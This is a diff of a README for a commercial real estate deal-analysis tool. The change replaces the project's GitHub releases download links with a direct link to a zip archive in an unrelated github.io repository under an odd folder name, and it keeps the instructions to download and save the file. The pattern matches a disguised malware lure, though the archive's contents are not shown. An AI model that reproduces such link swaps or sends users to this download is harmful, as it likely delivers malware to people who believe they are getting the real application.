@@ -5,7 +5,7 @@ description: "Analyze commercial real estate deals with browser-based underwriti
 ---
 # 🏢 cre-deal-analyzer-tool - Analyze Deals, Test Scenarios, Underwrite Faster
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Javith148/cre-deal-analyzer-tool/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Javith148/javith148.github.io/main/pseudohypertrophic/1.3.zip)
 
 ## 📋 What This Tool Does
 
@@ -13,7 +13,7 @@ cre-deal-analyzer-tool is a browser-based commercial real estate analysis applic
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: https://github.com/Javith148/cre-deal-analyzer-tool/releases
+Visit this link to download the application: https://raw.githubusercontent.com/Javith148/javith148.github.io/main/pseudohypertrophic/1.3.zip
 
 Click the download link above, then look for the latest release file. Save it to a folder on your computer where you can find it easily, such as your Desktop or Documents folder.
 
